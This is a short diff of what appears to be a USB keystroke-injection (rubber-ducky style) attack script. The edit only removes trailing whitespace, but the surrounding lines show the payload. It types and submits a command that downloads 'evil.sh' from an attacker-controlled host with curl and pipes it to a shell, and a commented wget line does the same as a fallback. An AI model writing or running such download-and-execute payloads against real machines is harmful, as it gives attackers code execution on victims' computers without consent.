@@ -48,6 +48,6 @@ QUACK DELAY 2000
 
 QUACK STRING curl "http://$HOST_IP/evil.sh" \| sh
 # in case curl isn't installed
-# QUACK STRING wget -O - "http://$HOST_IP/evil.sh" \| sh 
+# QUACK STRING wget -O - "http://$HOST_IP/evil.sh" \| sh
 QUACK ENTER
 LED SUCCESS
